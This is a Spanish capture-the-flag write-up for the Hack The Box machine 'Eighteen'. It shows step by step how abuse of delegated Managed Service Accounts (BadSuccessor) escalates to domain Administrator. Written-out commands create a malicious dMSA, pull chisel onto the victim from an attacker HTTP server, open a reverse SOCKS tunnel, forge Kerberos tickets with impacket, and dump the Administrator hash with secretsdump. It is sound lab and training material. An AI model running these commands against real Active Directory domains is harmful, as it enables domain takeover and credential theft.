Explotación dMSA#

Manual / FAILED#

Al final pude ver que podemos crear una dMSA dentro de la unidad organizativa Staff.

New-ADServiceAccount -Name "attack_dMSA" -DNSHostName "dontcare.com" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "DC01$" -path "OU=Staff,DC=eighteen,DC=htb"

Ahora que hemos creado y somos propretarios de esta dMSA, tenemos la capacidad de otrogarnos permisos para editar atributos de la misma. En este caso vamos a editar estos dos valores:

  • msDS-ManagedAccountPrecededByLink: en esta opción vamos a indicar el nombre destintivo (DN) de la cuenta a la que queremos remplazar.

  • msDS-DelegatedMSAState: establecemos el valor del estado de la dMSA en 2 para simular que la migración ha sido completada.

$dMSA = [ADSI]"LDAP://CN=attack_dMSA,OU=Staff,DC=eighteen,DC=htb"
$dMSA.Put("msDS-DelegatedMSAState", 2)
$dMSA.Put("msDS-ManagedAccountPrecededByLink", "CN=Administrator,CN=Users,DC=eighteen,DC=htb")
$dMSA.SetInfo()

Al ejecutar el $dMSA.SetInfo() me daba un Acceso denegado que no puede solucionar, con lo cual tuve que buscar otras maneras para explotar esta vulnerabilidad.

BadSuccessor.exe - Script#

Entonces buscando POC’s me encontré con BadSuccessor.exe (también lo descargamos a la máquina victima) que realiza el mismo proceso que intentamos manualmente pero esta vez si crea la dMSA y le añade los atributos correctamente:

.\BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -dmsa attack_dMSA2 -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname DC01 -user adam.scott -dc-ip 10.10.11.95

Luego de realizar todo este proceso tengo el problema de que no puedo recibir el TGS (Ticket Garanted Service) y el password hash ya que no existe ningún ticket decido importar chisel para hacer port forwarding sobre el puerto de autenticación kerberos para generar un TGT ( Ticket Garanting Ticket).

Port Forwarding with chisel + Abuse TGT#

Chisel Repository

Port Forwarding Examples

Nos descargamos chisel a nuestra máquina atacante con wget:

wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_386.zip

unzip -l chisel_1.11.3_windows_386.zip

Luego montamos un servidor http y con .DownloadFile nos descargamos el archivo a la máquina victima:

(New-Object Net.WebClient).DownloadFile('http://10.10.14.141:8081/chisel.exe','C:\Users\adam.scott\Desktop\mythings\chisel.exe')

Y ahora monto el servidor chisel en mi máquina atacante y el cliente chisel en la máquina víctima:

chisel server -p 33 --reverse

.\chisel.exe client 10.10.14.141:33 R:socks

(Necesitamos camabiar el archivo /etc/proxychains.conf a socks5)

proxychains -q getTGT.py eighteen.htb/adam.scott:'iloveyou1' -dc-ip 10.10.11.95 -debug

Aunque ejecute el comando con proxychains ahora recibimos el típico error de falta de sincronización con el servidor, con lo cual usando Faketime consigo solucionar este problema:

Tricks Faketime - Exegol

faketime '2025-11-28 05:41:58' zsh

proxychains -q getTGT.py eighteen.htb/adam.scott:'iloveyou1' -dc-ip 10.10.11.95

Ahora que tenemos ya el TGT del usuario adam.scott, podemos impersonar a la dMSA “attack_dMSA2” para obtener un ticket kerberos .ccache.

proxychains /root/.local/share/pipx/venvs/impacket/bin/getST.py -impersonate 'attack_dMSA2$' -dmsa -k -no-pass eighteen.htb/adam.scot -self

export KRB5CCNAME=/workspace/HTB/Eighteen/CONTENT/attack_dMSA2\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache

proxychains secretsdump.py -k -no-pass dc01.eighteen.htb -just-dc-user Administrator
